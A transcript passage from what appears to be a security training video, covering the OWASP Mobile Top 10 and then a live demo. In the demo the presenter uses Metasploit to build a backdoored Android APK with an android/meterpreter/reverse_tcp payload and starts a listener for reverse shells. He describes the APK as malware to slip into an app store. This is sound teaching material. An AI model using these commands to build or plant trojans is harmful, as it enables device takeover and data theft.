they do anyway?\n\n233\n00:11:29.590 --> 00:11:32.120\nBuffer overflow could happen here.\n\n234\n00:11:32.120 --> 00:11:34.860\n&gt;&gt; Incorrect usage or management of the.\n\n235\n00:11:34.860 --> 00:11:37.990\nThere's all these ways unintended\ndata leakage can happen.\n\n236\n00:11:37.990 --> 00:11:42.410\nSomething as simple as you just literally\ngoing in and accessing a file, but\n\n237\n00:11:42.410 --> 00:11:46.300\nnot remembering to close it and leaving it\nopen on your phone and somebody seeing it.\n\n238\n00:11:46.300 --> 00:11:49.370\nNot encrypting it or\nputting it into the right storage level.\n\n239\n00:11:49.370 --> 00:11:50.770\n&gt;&gt; And then making it available for\nsomebody.\n\n240\n00:11:50.770 --> 00:11:52.890\nThere's all these things that\npotentially could go wrong.\n\n241\n00:11:52.890 --> 00:11:57.230\nSo, wanna think about that, number five,\npoor authorization and authentication.\n\n242\n00:11:57.230 --> 00:11:59.080\nSo, this is another one that\nwe have to think about.\n\n243\n00:11:59.080 --> 00:12:01.590\nThis is just straight up access control,\nright.\n\n244\n00:12:01.590 --> 00:12:04.680\nAccess control 101 Are we\nusing single versus dual\n\n245\n00:12:04.680 --> 00:12:08.750\nversus multifactor authentication,\nif so how are we dealing with that?\n\n246\n00:12:08.750 --> 00:12:09.690\nYou know this attempt for\n\n247\n00:12:09.690 --> 00:12:15.040\ninstance to put a biometric association\ninto the Apple iOS and use that.\n\n248\n00:12:15.040 --> 00:12:18.470\nYour good first attempt, got to\napplaud them honestly for the attempt,\n\n249\n00:12:18.470 --> 00:12:20.520\nit's good to be thinking about that.\n\n250\n00:12:20.520 --> 00:12:24.020\nObviously wasn't implemented in a way that\na lot of people felt comfortable using it.\n\n251\n00:12:24.020 --> 00:12:27.770\nHasn't really, we haven't really seen good\nor very large I'm taking adoption on that.\n\n252\n00:12:27.770 --> 00:12:30.220\nIt's kind of, I think,\npeople thought about it more as a novelty.\n\n253\n00:12:30.220 --> 00:12:31.650\nI'll try that, and they got bored with it.\n\n254\n00:12:31.650 --> 00:12:35.070\nAnd they're like, whatever,\nI'm gonna go back to the four digit pin or\n\n255\n00:12:35.070 --> 00:12:37.430\nthe five digit pin or\nwhatever you may use.\n\n256\n00:12:37.430 --> 00:12:40.360\nAnd that's fine, but the challenge\nwith that is that we see this\n\n257\n00:12:40.360 --> 00:12:42.540\nstrike pattern on the glass\nif you don't clean it.\n\n258\n00:12:42.540 --> 00:12:44.400\n&gt;&gt; Yep.\n&gt;&gt; And a lot of people don't do that so\n\n259\n00:12:44.400 --> 00:12:45.420\nthat's an issue.\n\n260\n00:12:45.420 --> 00:12:50.190\nAnd in addition, you know it becomes\nsomething that is unfortunately for\n\n261\n00:12:50.190 --> 00:12:51.310\nus so wrote, you know.\n\n262\n00:12:51.310 --> 00:12:53.490\nWe're just doing it without\neven thinking about it,\n\n263\n00:12:53.490 --> 00:12:57.390\nthat you know we don't often think okay\nmaybe I should stop and do something else.\n\n264\n00:12:57.390 --> 00:13:02.490\nAnd so picture past and these alternate\nforms of authentication are good.\n\n265\n00:13:02.490 --> 00:13:04.600\nWe really have to think about\nstrengthening the authentication,\n\n266\n00:13:04.600 --> 00:13:07.510\nand authorization regimes in general\nbecause this is one of the key\n\n267\n00:13:07.510 --> 00:13:10.670\nareas where device will fall down.\n\n268\n00:13:10.670 --> 00:13:14.070\nAnd if we're not careful with this,\nthen we're gonna have a problem.\n\n269\n00:13:14.070 --> 00:13:16.800\nSo just keep that in mind and\nbe aware of that, right?\n\n270\n00:13:16.800 --> 00:13:20.910\nOn number six, we are thinking about\nbroken cryptography I believe.\n\n271\n00:13:20.910 --> 00:13:23.350\nSo if cryptography is\ngoing to be an issue.\n\n272\n00:13:23.350 --> 00:13:25.250\nAnd I actually wanna stay on this page for\na second.\n\n273\n00:13:25.250 --> 00:13:27.850\nI wanna show everybody something else\nI forgot to mention what goes on on\n\n274\n00:13:27.850 --> 00:13:29.270\nthe bottom with hey am I vulnerable and\nall that.\n\n275\n00:13:29.270 --> 00:13:30.600\nSo we'll show them that in a minute,\n\n276\n00:13:30.600 --> 00:13:33.690\ncuz that's also good for them to know,\nbroken photography, right.\n\n277\n00:13:33.690 --> 00:13:39.160\nSo, the issue here is if we implement\nweak cryptographic protections.\n\n278\n00:13:39.160 --> 00:13:42.940\nAnd they are subject to being broken\nis we talked about in the cryptography\n\n279\n00:13:42.940 --> 00:13:43.670\ndiscussions.\n\n280\n00:13:43.670 --> 00:13:46.470\nWe encourage you to watch these episodes,\nthey're pretty cool.\n\n281\n00:13:46.470 --> 00:13:50.220\nAnd also as we've talking about in some of\nthe other episodes, sniffing for instance,\n\n282\n00:13:50.220 --> 00:13:54.140\nwe talked about it there and we've\ntalked about it with finger printing and\n\n283\n00:13:54.140 --> 00:13:56.090\nsome of the other places\nwe speak about this.\n\n284\n00:13:56.090 --> 00:13:58.670\nAnd we had a whole discussion\non it in recently, right.\n\n285\n00:13:58.670 --> 00:14:02.465\nWith the week WEP implementation,\nhow RC4 was implemented incorrectly.\n\n286\n00:14:02.465 --> 00:14:06.415\nSo if we can implement cryptography\nin a way that does not create secure,\n\n287\n00:14:06.415 --> 00:14:10.605\nstrong protections for confidentiality,\nthey may be broken over time,\n\n288\n00:14:10.605 --> 00:14:12.580\nWEP is a classic example of this.\n\n289\n00:14:12.580 --> 00:14:16.230\nAnd as result we have to be considering\nthe fact that we may actually set\n\n290\n00:14:16.230 --> 00:14:18.680\nourselves up to be compromised\nwith out thinking about it.\n\n291\n00:14:18.680 --> 00:14:22.160\nWhat I was just gonna mentioned was\ndown below the actual discussion\n\n292\n00:14:22.160 --> 00:14:24.550\nyou'll see they give you\nan am I vulnerable section.\n\n293\n00:14:24.550 --> 00:14:27.060\nYou've got some links there to\nvarious things that may be helpful.\n\n294\n00:14:27.060 --> 00:14:27.880\nThey got some stuff.\n\n295\n00:14:27.880 --> 00:14:30.190\nThis one happens to talk about\npuppet key management and\n\n296\n00:14:30.190 --> 00:14:31.090\nsome of the other stuff there.\n\n297\n00:14:31.090 --> 00:14:32.810\nThere's also a nice reference section.\n\n298\n00:14:32.810 --> 00:14:35.230\nTraditionally there also usually\nhas some good stuff in it.\n\n299\n00:14:35.230 --> 00:14:37.800\nSo you should definitely examine each\none of these [INAUDIBLE] in depth\n\n300\n00:14:37.800 --> 00:14:40.370\nas some body who is looking for\nthis stuff it will be helpful.\n\n301\n00:14:40.370 --> 00:14:43.360\nNumber seven is Client Side Injection,\nI believe.\n\n302\n00:14:43.360 --> 00:14:46.650\nIn the injection attack discussions and\n\n303\n00:14:46.650 --> 00:14:50.820\nthe sequenced what hacking episodes again,\nI encourage you to watch those.\n\n304\n00:14:50.820 --> 00:14:52.850\nThink about those,\nreally good stuff there.\n\n305\n00:14:52.850 --> 00:14:56.740\nWe do talk about the OS top ten web\napplication vulnerability list.\n\n306\n00:14:56.740 --> 00:14:59.010\nAnother top ten you see\nus go through in depth.\n\n307\n00:14:59.010 --> 00:15:03.240\nWe do have injection attacks on the radar\nthere, we have to think about them.\n\n308\n00:15:03.240 --> 00:15:07.220\nAnytime we can through either\nlack of boundary checking,\n\n309\n00:15:07.220 --> 00:15:12.460\nlack of data input validation, lack of\ngeneral controls that would prevent\n\n310\n00:15:12.460 --> 00:15:15.060\ninjections in a variety\nof ways from happening.\n\n311\n00:15:15.060 --> 00:15:17.860\nBut anytime we're allowing this to\noccur because we're not implementing\n\n312\n00:15:17.860 --> 00:15:19.920\nthe security protocols properly.\n\n313\n00:15:19.920 --> 00:15:22.870\nWe can fall prey to\nthe fact that bad code and\n\n314\n00:15:22.870 --> 00:15:26.990\nor just a variety of exploit\ntechniques can be used.\n\n315\n00:15:26.990 --> 00:15:31.190\nBut typically it's gonna be bad code\nof some kind, a malicious SQL query.\n\n316\n00:15:31.190 --> 00:15:34.660\nA malicious code of some kind,\na directory traversal attack or\n\n317\n00:15:34.660 --> 00:15:36.390\nwe're doing dot dot dash attacks.\n\n318\n00:15:36.390 --> 00:15:40.640\nAny of those things can be injected here\ncausing probably more often than not\n\n319\n00:15:40.640 --> 00:15:43.990\nbuffer overflows, and as a result\nlikely the ability to be able to.\n\n320\n00:15:43.990 --> 00:15:46.396\nDump to some sort of a command prompt or\n\n321\n00:15:46.396 --> 00:15:51.296\nsome sort of administrative access level\nthat gives us rights in the system.\n\n322\n00:15:51.296 --> 00:15:53.925\nVery susceptible devices are if\nthey've been jailbroken and\n\n323\n00:15:53.925 --> 00:15:57.020\nrooted to this kind of an attack, so\nthis is something else to consider.\n\n324\n00:15:57.020 --> 00:15:57.902\nIn combination with that.\n\n325\n00:15:57.902 --> 00:16:03.420\nNumber eight would be security\ndecisions via untrusted inputs.\n\n326\n00:16:03.420 --> 00:16:06.100\nSo this is the issue of, you know,\n\n327\n00:16:06.100 --> 00:16:10.560\nessentially bad data making bad decisions,\nor allowing us to make bad decisions.\n\n328\n00:16:10.560 --> 00:16:13.970\nIf we're making decisions without\nfull context and full awareness, and\n\n329\n00:16:13.970 --> 00:16:16.590\nwe are getting information from\nsources that we don't know and\n\n330\n00:16:16.590 --> 00:16:20.025\ntrust, we may be led down the path\nof making erroneous discussions.\n\n331\n00:16:20.025 --> 00:16:22.905\n&gt;&gt; Mm-hm.\n&gt;&gt; Erroneous decisions, excuse me.\n\n332\n00:16:22.905 --> 00:16:24.170\n&gt;&gt; [LAUGH]\n&gt;&gt; I wanna just make sure we're aware of\n\n333\n00:16:24.170 --> 00:16:26.720\nthat and\nthat's obviously something to consider.\n\n334\n00:16:26.720 --> 00:16:29.030\nMaking sure that with number nine, right?\n\n335\n00:16:29.030 --> 00:16:29.595\nYeah, yeah, yeah.\n\n336\n00:16:29.595 --> 00:16:31.680\n&gt;&gt; Mm-hm.\n&gt;&gt; Improper session handling,\n\n337\n00:16:31.680 --> 00:16:34.580\nif we're not dealing\nwith session correctly.\n\n338\n00:16:34.580 --> 00:16:36.770\nSo this is the use of secure protocols,\nfor instance.\n\n339\n00:16:36.770 --> 00:16:39.630\nI think they talk about HTTPS there,\nfor instance, right?\n\n340\n00:16:39.630 --> 00:16:44.810\nAnd using secure transmission mechanisms,\nVPNs, tunnels, things like that, but also,\n\n341\n00:16:44.810 --> 00:16:50.720\nif we're not dealing with session teardown\nproperly and getting rid of sessions.\n\n342\n00:16:50.720 --> 00:16:54.930\nAnd also session setup, and what this also\ngets to is single use session IDs, and\n\n343\n00:16:54.930 --> 00:16:57.420\nsession timeouts,\nwhich would also be part of this.\n\n344\n00:16:57.420 --> 00:17:00.950\nIf we're using single session or\nsingle use session IDs so\n\n345\n00:17:00.950 --> 00:17:03.950\nthat if we are bumped off or if something\nhappens, we can't reauthenticate\n\n346\n00:17:03.950 --> 00:17:08.210\npreventing replay attacks, but\nrather forcing us to create a new session.\n\n347\n00:17:08.210 --> 00:17:10.860\nSo single use session\nID is very important.\n\n348\n00:17:10.860 --> 00:17:16.940\nAlso making sure that we use timeouts on\nany activities, or on activity counters\n\n349\n00:17:16.940 --> 00:17:22.840\nfor timeouts on sessions to prevent us\nfrom having an issue where we may actually\n\n350\n00:17:22.840 --> 00:17:27.750\nwalk away from the machine hypothetically,\nand then somebody else can take it on, and\n\n351\n00:17:27.750 --> 00:17:29.980\ncan pick it up and\nessentially do what they wanna do with it.\n\n352\n00:17:29.980 --> 00:17:32.950\nThat's also very important for\nus to consider and think about, right?\n\n353\n00:17:32.950 --> 00:17:36.180\nAnd then number ten the last one I\nbelieve we are up there lack of binary\n\n354\n00:17:36.180 --> 00:17:37.180\nprotections, right?\n\n355\n00:17:37.180 --> 00:17:39.010\nSo we wanna be thinking about the fact.\n\n356\n00:17:39.010 --> 00:17:41.984\nActually zoom in on this one cuz this\none has kind of an interesting little\n\n357\n00:17:41.984 --> 00:17:42.758\naside here so.\n\n358\n00:17:42.758 --> 00:17:47.067\nOkay, well I didn't mean like so close\nthat it was like hey, look at that tile.\n\n359\n00:17:47.067 --> 00:17:48.999\n&gt;&gt; [LAUGH] Did you notice?\n\n360\n00:17:48.999 --> 00:17:50.543\n&gt;&gt; Exactly look it's tunnel vision.\n\n361\n00:17:50.543 --> 00:17:53.045\n&gt;&gt; [LAUGH]\n&gt;&gt; 360 degrees.\n\n362\n00:17:53.045 --> 00:17:54.188\nSniff O Matic, right?\n\n363\n00:17:54.188 --> 00:17:56.980\n&gt;&gt; That's right.\n&gt;&gt; So what we're talking about here is\n\n364\n00:17:56.980 --> 00:18:01.330\nthe fact that adversaries can analyze and\nreverse engineer the apps code.\n\n365\n00:18:01.330 --> 00:18:05.150\nSo in other words, if we don't properly\nprotect the app, digitally signing\n\n366\n00:18:05.150 --> 00:18:10.110\nthe code, using validation techniques and\nintegrity and confidentiality techniques\n\n367\n00:18:10.110 --> 00:18:14.120\nto protect the codes so it cannot be\nused against us, this will be a problem.\n\n368\n00:18:14.120 --> 00:18:17.570\nWhat I wanted to show everybody was\nif you move into security weakness,\n\n369\n00:18:17.570 --> 00:18:18.920\nit's kind of in the middle, right?\n\n370\n00:18:20.210 --> 00:18:24.870\nAnd then if we go down just a little bit,\nyeah, under detectability rights.\n\n371\n00:18:24.870 --> 00:18:27.410\nSo if you go down, just zoom in just for\na second there, just so\n\n372\n00:18:27.410 --> 00:18:29.210\nwe can see just a little bit more of it.\n\n373\n00:18:29.210 --> 00:18:32.426\nReally it's more for me because I'm not\nable to see it from that far away because\n\n374\n00:18:32.426 --> 00:18:34.260\nI'm standing all the way\nacross the studio.\n\n375\n00:18:34.260 --> 00:18:36.250\n&gt;&gt; Now I can see I just\nwanted to point out.\n\n376\n00:18:36.250 --> 00:18:38.870\nThe thing I was gonna point\nout was they actually, and\n\n377\n00:18:38.870 --> 00:18:41.080\nthis one in particular,\nhave a bunch of footnotes.\n\n378\n00:18:41.080 --> 00:18:42.790\nYou'll see them after various places.\n\n379\n00:18:42.790 --> 00:18:45.930\nThose refer to the references down at\nthe bottom that we were talking about.\n\n380\n00:18:45.930 --> 00:18:47.607\n&gt;&gt; Mm, okay.\n&gt;&gt; If you wanna find out more about\n\n381\n00:18:47.607 --> 00:18:51.145\nsomething like it says there, reverse\nengineering code in an iTunes app or\n\n382\n00:18:51.145 --> 00:18:55.248\nGoogle Play or whatever, they've actually\ngot some footnotes that talk about some of\n\n383\n00:18:55.248 --> 00:18:56.557\nthat stuff as references.\n\n384\n00:18:56.557 --> 00:18:59.445\nSo you can go down and take a look at,\nkinda cool, some of the stories and\n\n385\n00:18:59.445 --> 00:19:00.810\nthings that they mention there.\n\n386\n00:19:00.810 --> 00:19:04.200\nSo just wanted to point that out to you,\nmake sure you got a chance to see that.\n\n387\n00:19:04.200 --> 00:19:09.910\nSo these are the OWASP Top 10 Risks\nassociated with mobile platforms and\n\n388\n00:19:09.910 --> 00:19:11.580\nwanna make sure we're aware of these.\n\n389\n00:19:11.580 --> 00:19:14.221\nVery, very important for\nus to know what they are and\n\n390\n00:19:14.221 --> 00:19:16.576\nto what feel comfortable\ntalking about them.\n\n391\n00:19:16.576 --> 00:19:19.192\nYou may get asked about one or\nmore them would be really good for\n\n392\n00:19:19.192 --> 00:19:20.660\nyou to take the time to go through.\n\n393\n00:19:20.660 --> 00:19:23.630\nWe did kind of thorough\ndeep dive on that list.\n\n394\n00:19:23.630 --> 00:19:25.910\nBut I want to make sure you guys\nare comfortable going through it.\n\n395\n00:19:25.910 --> 00:19:28.690\nYou have a sense of it and\nyou understand what's going on there.\n\n396\n00:19:28.690 --> 00:19:31.098\nSo speaking of having a sense,\nspeaking of understanding,\n\n397\n00:19:31.098 --> 00:19:33.616\nas I was speaking about because\nyou weren't saying anything.\n\n398\n00:19:33.616 --> 00:19:34.672\nYou're just sitting there quietly.\n\n399\n00:19:34.672 --> 00:19:36.624\n&gt;&gt; [LAUGH]\n&gt;&gt; And waiting for me to say something.\n\n400\n00:19:36.624 --> 00:19:38.560\n&gt;&gt; Takes a lot of focus to drive.\n\n401\n00:19:38.560 --> 00:19:39.670\n&gt;&gt; Right.\nGo with that.\n\n402\n00:19:39.670 --> 00:19:43.060\nThat's what we're gonna tell the people\nin our studio audience, right.\n\n403\n00:19:43.060 --> 00:19:44.990\nSo as you see me moving off screen,\n\n404\n00:19:44.990 --> 00:19:47.930\nwhat we want to do is actually\ngo over to my machine.\n\n405\n00:19:47.930 --> 00:19:49.670\nWe're gonna do a quick hands on demo for\nyou.\n\n406\n00:19:49.670 --> 00:19:50.381\nCan we go full screen on that?\n\n407\n00:19:50.381 --> 00:19:52.939\nBecause you're not gonna be able to see\nanything in there [LAUGH] without that.\n\n408\n00:19:52.939 --> 00:19:57.210\nSo what we're gonna do is,\nwe're building on this concept.\n\n409\n00:19:57.210 --> 00:19:59.790\nSo I thought it would be cool, you and\nI were talking a bit about this and\n\n410\n00:19:59.790 --> 00:20:02.190\nI said I can do this kind of a demo,\nwouldn't this be cool?\n\n411\n00:20:02.190 --> 00:20:04.886\nAnd you should have seen\nthe look in Mike's eyes.\n\n412\n00:20:04.886 --> 00:20:06.615\n&gt;&gt; [LAUGH]\n&gt;&gt; He was like a kid in a candy store.\n\n413\n00:20:06.615 --> 00:20:07.812\nHe's like, you can do that?\n\n414\n00:20:07.812 --> 00:20:08.834\nWow.\n\n415\n00:20:08.834 --> 00:20:10.545\nThat is so cool, right?\n\n416\n00:20:10.545 --> 00:20:12.636\nThat's better than blue so\nI wanna do that.\n\n417\n00:20:12.636 --> 00:20:17.092\nSo what we are gonna do is we are actually\ngonna take a look at how you can use\n\n418\n00:20:17.092 --> 00:20:22.207\nKali LINUX to be able to use the platform,\nthe Metasploit framework, and be able to\n\n419\n00:20:22.207 --> 00:20:27.399\ncreate an attack package, essentially\nan application that is malware that you're\n\n420\n00:20:27.399 --> 00:20:33.060\nthen gonna be able to surreptitiously, if\nyou're careful, deploy into an app store.\n\n421\n00:20:33.060 --> 00:20:36.400\nIf somebody downloads it on their mobile\ndevice, we're not gonna do that part.\n\n422\n00:20:36.400 --> 00:20:40.170\nBut we are gonna create the exploit\npackage, the APK, right?\n\n423\n00:20:40.170 --> 00:20:41.195\nAnd if we do that and\n\n424\n00:20:41.195 --> 00:20:44.435\nthen we position it, we may be able\nto essentially take over the device.\n\n425\n00:20:44.435 --> 00:20:48.405\nSo I'm gonna show you essentially\nhow to create malware right now and\n\n426\n00:20:48.405 --> 00:20:50.065\nuse it to attack a mobile platform.\n\n427\n00:20:50.065 --> 00:20:51.275\nSo stay tuned.\n\n428\n00:20:51.275 --> 00:20:53.095\nAll right, so this is what we're gonna do.\n\n429\n00:20:53.095 --> 00:20:54.660\nI've already preloaded Kali.\n\n430\n00:20:54.660 --> 00:20:56.840\nYou can see it's up and\nrunning in our virtual environment.\n\n431\n00:20:56.840 --> 00:21:01.020\nI've just gone ahead and\nspun up Metasploit and I've started\n\n432\n00:21:01.020 --> 00:21:05.220\njust creating the general background\nmaterial we need just to get ready,\n\n433\n00:21:05.220 --> 00:21:08.040\nso you're not seeing me type in a whole\nbunch of stuff that's kind of meaningless.\n\n434\n00:21:09.330 --> 00:21:12.090\nBut inside the Metasploit framework,\n\n435\n00:21:12.090 --> 00:21:14.350\nI just pulled up a quick\nlisting of all the payloads.\n\n436\n00:21:14.350 --> 00:21:20.270\nWe're gonna use the Android meterpreter\nreverse TCP payload engine.\n\n437\n00:21:20.270 --> 00:21:23.632\nSo we're actually gonna create an APK\nthat is gonna use that exploit.\n\n438\n00:21:23.632 --> 00:21:28.654\nSo I've gone ahead, and in the first\nline of code here down at the bottom,\n\n439\n00:21:28.654 --> 00:21:34.648\nI've loaded msf, or I've typed in\nmsfpayload android/meterpreter/reverse_TCP\n\n440\n00:21:34.648 --> 00:21:41.380\nlhost for local host, set it equal to my\nmachine, 192.168.0.3, and then capital O.\n\n441\n00:21:41.380 --> 00:21:45.650\nAnd that's gonna allow me to make\n\n442\n00:21:45.650 --> 00:21:49.700\nsure that I set the local host by\ntyping that in along with MSF payload.\n\n443\n00:21:49.700 --> 00:21:50.850\nSo I've done that already.\n\n444\n00:21:50.850 --> 00:21:54.510\nNow I also modified the Apache conf file,\nby the way, and\n\n445\n00:21:54.510 --> 00:21:57.610\nset server name equal\nto localhost in there.\n\n446\n00:21:57.610 --> 00:22:00.210\nSo I went in and did that the in\nthe empty Apache directory.\n\n447\n00:22:00.210 --> 00:22:01.910\nSo, as you see,\nI've done that ahead of time.\n\n448\n00:22:01.910 --> 00:22:02.430\nNo big deal.\n\n449\n00:22:02.430 --> 00:22:05.620\nThat obviously is something you can\nfigure out how to do pretty easily.\n\n450\n00:22:05.620 --> 00:22:07.530\nSo I've done that and set that up.\n\n451\n00:22:07.530 --> 00:22:08.650\nAnd now that I've done that,\n\n452\n00:22:09.670 --> 00:22:13.950\nwhat I'm gonna do is actually generate\na reverse a Meterpreter application.\n\n453\n00:22:13.950 --> 00:22:17.250\nSo this is actually the command\nthat's gonna create the APK.\n\n454\n00:22:17.250 --> 00:22:19.240\nSo I'm gonna type this in now.\n\n455\n00:22:19.240 --> 00:22:26.530\nSo I'm gonna type in msf pay load, and\nMSF like Microsoft Solution Framework.\n\n456\n00:22:26.530 --> 00:22:27.470\n&gt;&gt; Nice [LAUGH].\n\n457\n00:22:27.470 --> 00:22:32.224\n&gt;&gt; And\nI'm gonna type in android/meterpreter, and\n\n458\n00:22:32.224 --> 00:22:38.535\nI'm gonna try to spell correctly so\nwe don't have to do this twice.\n\n459\n00:22:38.535 --> 00:22:43.604\nAnd then /reverse_tcp.\n\n460\n00:22:43.604 --> 00:22:49.743\nAnd then L host equal to.\n\n461\n00:22:49.743 --> 00:22:50.454\nWhat is that?\n\n462\n00:22:50.454 --> 00:22:54.683\n192 168.0.3, and\n\n463\n00:22:54.683 --> 00:22:58.579\nthen so I've got all that.\n\n464\n00:22:58.579 --> 00:23:02.638\nThen, I'm gonna do capital O, capital R.\n\n465\n00:23:02.638 --> 00:23:06.638\nThen, I'm gonna do, well, that and\n\n466\n00:23:06.638 --> 00:23:11.014\nthen I'm going to type in the name of the,\n\n467\n00:23:15.768 --> 00:23:17.055\nActually one second.\n\n468\n00:23:17.055 --> 00:23:17.678\n&gt;&gt; Mm-hm.\n\n469\n00:23:21.432 --> 00:23:25.794\n&gt;&gt; [SOUND] Yeah okay,\njust want to make sure I've got it.\n\n470\n00:23:25.794 --> 00:23:31.959\nOkay, so backdoor.apk and hit Enter.\n\n471\n00:23:31.959 --> 00:23:34.980\nAnd so I'm just naming the APK\nfile whatever I wanna call it.\n\n472\n00:23:34.980 --> 00:23:35.880\nI just called it backdoor.\n\n473\n00:23:35.880 --> 00:23:37.890\nYou can call it whatever\nyou want obviously but\n\n474\n00:23:37.890 --> 00:23:42.970\nthe .APK extension is gonna be the package\nwe deliver as an Android app file, right?\n\n475\n00:23:42.970 --> 00:23:44.150\n&gt;&gt; Okay.\n&gt;&gt; So we're gonna be able to actually\n\n476\n00:23:44.150 --> 00:23:44.980\nthen use that.\n\n477\n00:23:44.980 --> 00:23:47.364\nSo this is the application package file,\nright,\n\n478\n00:23:47.364 --> 00:23:49.310\nthe backdoor APK of whatever we create.\n\n479\n00:23:49.310 --> 00:23:53.845\nAnd so now that I have that,\nI'm actually able to go in,\n\n480\n00:23:53.845 --> 00:23:57.620\nif I choose to, and\nI'm actually able to now.\n\n481\n00:23:57.620 --> 00:24:05.000\nUse that file to be able to go in,\nyou'll deliver a exploit.\n\n482\n00:24:05.000 --> 00:24:06.030\nSo let's just take a look at this.\n\n483\n00:24:06.030 --> 00:24:09.089\nSo now I'm gonna actually\nlaunch the metasploit console.\n\n484\n00:24:09.089 --> 00:24:13.690\nSo I'm gonna go I'll just do it in\nthe same console as opposed to opening\n\n485\n00:24:13.690 --> 00:24:14.775\na separate one.\n\n486\n00:24:14.775 --> 00:24:20.175\nSo I'm gonna go in and\nI'm gonna launch msfconsole, right?\n\n487\n00:24:20.175 --> 00:24:23.450\nAnd so let me just launch this, it's gonna\ntake a minute to spin up by the way.\n\n488\n00:24:23.450 --> 00:24:28.340\nThe Metasploit Framework Console is going\nto be, something that has to be loaded,\n\n489\n00:24:28.340 --> 00:24:31.170\nso it's gonna take a moment, it's kinda\nconfigure itself behind the scenes.\n\n490\n00:24:31.170 --> 00:24:34.700\nSo we'll give that a minute, that'll\ncome up and probably, I don't know.\n\n491\n00:24:34.700 --> 00:24:37.615\nYeah, maybe a minute, minute and a half,\nsomething like that, not too long.\n\n492\n00:24:37.615 --> 00:24:38.560\nBut once, we get in there.\n\n493\n00:24:38.560 --> 00:24:39.510\nThere we go.\n\n494\n00:24:39.510 --> 00:24:41.442\nMetasploit going on there.\n\n495\n00:24:41.442 --> 00:24:43.650\nAll right, well old school Metasploit.\n\n496\n00:24:43.650 --> 00:24:47.220\nAnd then we're gonna go in, we're gonna\ntype in a quick use command here.\n\n497\n00:24:47.220 --> 00:24:51.229\nJust gonna do our exploit and\na multi handler.\n\n498\n00:24:52.740 --> 00:24:54.900\nAnd get that going.\n\n499\n00:24:56.510 --> 00:24:58.770\nAll right, so\nwe're now down in the sub directory.\n\n500\n00:24:58.770 --> 00:25:01.080\nYou could see I've got a prompt for\nexploit handler.\n\n501\n00:25:01.080 --> 00:25:04.380\nAnd so\nnow we're gonna load our essentially or\n\n502\n00:25:04.380 --> 00:25:06.700\nwhat we're doing here\n[INAUDIBLE] step back.\n\n503\n00:25:06.700 --> 00:25:10.830\nWhat we're doing is setting up\nthe handler that's gonna handle exploits\n\n504\n00:25:10.830 --> 00:25:14.180\nlaunched outside the framework, so we're\nessentially getting into the queue where\n\n505\n00:25:14.180 --> 00:25:19.070\nwe can throw a framework exploit out and\nrun it outside the framework itself.\n\n506\n00:25:19.070 --> 00:25:22.140\nSo we're doing that and\nthen what we're gonna do is,\n\n507\n00:25:22.140 --> 00:25:25.530\nI'm gonna go ahead and\nset the payload in motion here.\n\n508\n00:25:25.530 --> 00:25:29.810\nSo I'm gonna set payload,\nopen Bombay doors as they say.\n\n509\n00:25:29.810 --> 00:25:30.870\nSo I'm gonna set payload.\n\n510\n00:25:30.870 --> 00:25:31.568\nI have to just call it.\n\n511\n00:25:31.568 --> 00:25:38.580\nSo I'm gonna do android/meterpreter,\nagain make sure I type that.\n\n512\n00:25:38.580 --> 00:25:41.701\nI always wi undp typing meterpeter\nbecause I'm not paying attention and\n\n513\n00:25:41.701 --> 00:25:43.047\nthat doesn't work real well.\n\n514\n00:25:43.047 --> 00:25:49.261\nAnd then, reverse_tcp and\nhit Enter, so we got that.\n\n515\n00:25:49.261 --> 00:25:50.669\nSo now we've got that set.\n\n516\n00:25:50.669 --> 00:25:54.342\nAnd now we're gonna set local host, so\n\n517\n00:25:54.342 --> 00:25:59.573\nI'm gonna do set LHOST and\nI'm gonna set that equal to,\n\n518\n00:25:59.573 --> 00:26:04.929\nlet me just type in my\naddress 192.168.0.3.\n\n519\n00:26:04.929 --> 00:26:08.180\nSet that, all right we got that going.\n\n520\n00:26:08.180 --> 00:26:14.710\nAnd then do a little show options just for\ngood measure.\n\n521\n00:26:14.710 --> 00:26:16.070\nSo we could see it's set there.\n\n522\n00:26:16.070 --> 00:26:19.780\nWe got our listening port,\nour listening address, listening port.\n\n523\n00:26:19.780 --> 00:26:22.150\nOur listening address is\nnow our localhost address.\n\n524\n00:26:22.150 --> 00:26:24.080\nWe could see the listening port is there.\n\n525\n00:26:24.080 --> 00:26:25.620\nSo we've got that set up.\n\n526\n00:26:25.620 --> 00:26:27.690\nAnd so now, I'm gonna go ahead.\n\n527\n00:26:27.690 --> 00:26:30.120\nI'm gonna launch the exploit buffer.\n\n528\n00:26:30.120 --> 00:26:32.210\nI essentially would the exploit up.\n\n529\n00:26:32.210 --> 00:26:33.610\nHave it just listening.\n\n530\n00:26:33.610 --> 00:26:36.000\nWaiting for the code to go live.\n\n531\n00:26:36.000 --> 00:26:38.391\nSo exploit- j z.\n\n532\n00:26:38.391 --> 00:26:38.961\nAll right?\n\n533\n00:26:38.961 --> 00:26:40.353\n&gt;&gt; Uh-huh.\n\n534\n00:26:40.353 --> 00:26:41.880\n&gt;&gt; So we're gonna set that up.\n\n535\n00:26:41.880 --> 00:26:44.290\nYou could see now that\nthe exploit's been started.\n\n536\n00:26:44.290 --> 00:26:49.005\nThe reverse handler's running on\n192.168.0.3 on port 4444 and it is,\n\n537\n00:26:49.005 --> 00:26:52.650\ns tarting the payload handler and\nit's essentially just waiting.\n\n538\n00:26:52.650 --> 00:26:58.550\nAll right now, and so what I'll do now is\nI would switch over to an Android device,\n\n539\n00:26:58.550 --> 00:27:04.480\nwhatever device I may want to\nultimately take over, if we had a real\n\n540\n00:27:04.480 --> 00:27:08.070\nAndroid device that we could plug into the\nlab environment, absolutely would do this.\n\n541\n00:27:08.070 --> 00:27:10.376\nObviously, because of the constraints\nof the virtual environment and\n\n542\n00:27:10.376 --> 00:27:12.070\nthings like that, we're not doing that.\n\n543\n00:27:12.070 --> 00:27:12.750\nAnd when we asked,\n\n544\n00:27:12.750 --> 00:27:16.099\nnobody was willing to lend us their\n[LAUGH] Android device to root.\n\n545\n00:27:16.099 --> 00:27:16.750\n&gt;&gt; [LAUGH]\n&gt;&gt; I said, hey,\n\n546\n00:27:16.750 --> 00:27:18.030\nwould you mind if I borrowed that?\n\n547\n00:27:18.030 --> 00:27:18.740\nEverybody said no.\n\n548\n00:27:18.740 --> 00:27:19.630\nYou, absolutely not.\n\n549\n00:27:19.630 --> 00:27:21.150\nWe're not giving that to you.\n\n550\n00:27:21.150 --> 00:27:25.900\nSo what we would do is obviously at this\npoint, if we did have an Android device\n\n551\n00:27:25.900 --> 00:27:30.940\nand we went in to pull down\nthrough let's say browser icon,\n\n552\n00:27:30.940 --> 00:27:32.440\nif let's say we opened up a web 